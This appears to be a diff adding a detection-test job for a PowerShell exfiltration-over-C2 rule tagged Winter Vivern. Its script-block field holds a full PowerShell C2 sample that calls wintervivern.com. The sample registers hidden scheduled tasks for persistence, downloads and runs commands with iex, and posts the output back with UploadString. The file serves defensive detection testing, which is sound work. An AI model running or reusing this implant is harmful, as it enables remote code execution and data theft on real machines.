@@ -1,0 +1,105 @@
+type: job
+name: Windows Exfiltration Over C2 Via Powershell UploadString
+detection:
+  source: escu
+  name: "ESCU - Windows Exfiltration Over C2 Via Powershell UploadString - Rule"
+  id: 59e8bf41-7472-412a-90d3-00f3afa452e9
+description: |
+  Validates detection of PowerShell data upload through Net.WebClient
+  UploadString: PowerShell/Operational EID 4104 (Script Block Logging)
+  records a block, read from a script file, that defines a sendData function
+  posting data to a remote URL with (New-Object Net.Webclient).UploadString,
+  and a loop that downloads commands with DownloadString, runs them with iex
+  and passes the output to sendData.
+tags: [winter-vivern]
+
+mitre:
+  tactics: [exfiltration]
+  techniques: [T1041]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+
+workloads:
+  - scenario: scenarios/windows/powershell/script-block/script-block-logged
+    bindings:
+      domain_short:      ref.domain_short
+      domain_tld:        ref.domain_tld
+      computer:          ref.computer
+      provider_guid:     "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+      script_path:       "C:\\Temp\\1.ps1"
+      script_block_text: "$uname = whoami;\r\n\
+        $singleHost = 'https://wintervivern.com/'\r\n\
+        $xmlUri =\"'\" + \"https://wintervivern.com/userfolders/1.php\"+ \";\";\r\n\
+        $n = '$g'\r\n\
+        \r\n\
+        function regSchTask{\r\n\
+        \t$userId=get-wmiobject -class win32_useraccount | ? {$_.caption -eq $uname } |%{$_.sid};\r\n\
+        \t$s = (New-Object Net.Webclient).DownloadString($singleHost+\"1111.xml\");\r\n\
+        \t$s = $s.replace('<author>$name</author>', \"<author>$uname</author>\");\r\n\
+        \t$s = $s.replace('<userid>$userId</userid>',\"<userid>$userId</userid>\");\r\n\
+        \t$s = $s.replace('<arguments></arguments>',\"<arguments> -w hidden -c `\"$n=New-Object Net.Webclient;$n.credentials=[net.credentialcache]::DefaultNetworkCredentials;iex $n.DownloadString($xmlUri)`\"</arguments>\");\r\n\
+        \t$s |out-file $enc:appdata/XmlSchemaMicrosoftXsd.xml;\r\n\
+        \tschtasks /create /xml \"$env:appdata/XmlSchemaMicrosoftXsd.xml\" /tn\r\n\
+        \t\"Client_Update_Microsoft-{ITCUNTH-9D12-4RE18BWD-6HFI2D4FNI1T2}\"\r\n\
+        \tremove-item $env:appdata/XmlSchemaMicrosoftXsd.xml\r\n\
+        }\r\n\
+        \r\n\
+        function regSchTask0{\r\n\
+        \t$userId=get-wmiobject -class win32_useraccount | ? {$_.caption -eq $uname } |%{$_.sid};\r\n\
+        \t$s = (New-Object Net.Webclient).DownloadString($singleHost+\"2222.xml\");\r\n\
+        \t$s = $s.replace('<author>$name</author>', \"<author>$uname</author>\");\r\n\
+        \t$s = $s.replace('<userid>$userId</userid>',\"<userid>$userId</userid>\");\r\n\
+        \t$s = $s.replace('<arguments></arguments>',\"<arguments> -w hidden -c `\"$n=New-Object Net.Webclient;$n.credentials=[net.credentialcache]::DefaultNetworkCredentials;iex $n.DownloadString($xmlUri)`\"</arguments>\");\r\n\
+        \t$s | out-file $enc:appdata/XmlSchemaMicrosoftXsd.xml;\r\n\
+        \tschtasks /create /xml \"$env:appdata/XmlSchemaMicrosoftXsd.xml\" /tn\r\n\
+        \t\"Client_Update_Microsoft-{ITCUNTH-9D12-4RE18BWD-6HFI2D4FNI1T2}\"\t\r\n\
+        \t\r\n\
+        }\r\n\
+        \r\n\
+        function sendData($message){\r\n\
+        \ttry{\r\n\
+        \t\tif ($message -ne $null)\r\n\
+        \t\t{\r\n\
+        \t\t\t(New-Object Net.Webclient).UploadString($singleHost + \"senddata.php\",($message -join \"`r`n\"))\t\r\n\
+        \t\t}\t\r\n\
+        \t}\r\n\
+        \tcatch{($Error[0])}\r\n\
+        }\r\n\
+        \r\n\
+        function starter{\r\n\
+        \t$message = try{\r\n\
+        \t\t$com=(New-Object Net.Webclient).DownloadString(\"singleHost\" + \"starter/php\");\r\n\
+        \t\tif($com.Lenght -ge 1)\r\n\
+        \t\t{\r\n\
+        \t\t\tiex $com\r\n\
+        \t\t}\r\n\
+        \t}\r\n\
+        \tcatch{($Error[0])};\r\n\
+        \tsendData($message);\r\n\
+        \tsleep 10;\r\n\
+        \tstarter\r\n\
+        \t\r\n\
+        }\r\n\
+        \r\n\
+        \r\n\
+        $runnable = try {schtasks | ? {$_ -like \"*9D36*\"}}catch{};\r\n\
+        $os = ([system.environment]::osversion).version.major;\r\n\
+        if($runnable -eq $null){\r\n\
+        \tif($os -le 6){regSchTask0| out-null;}\r\n\
+        \telse{regSchTask0| out-null;}\r\n\
+        \tstarter|out-null\r\n\
+        }\r\n\
+        else{\r\n\
+        \tstarter|out-null\r\n\
+        }"
+    expectation:
+      expected: alert
+      summary: "PowerShell logs a block that posts command output with Net.WebClient UploadString"
+      mitre:
+        tactics: [exfiltration]
+        techniques: [T1041]
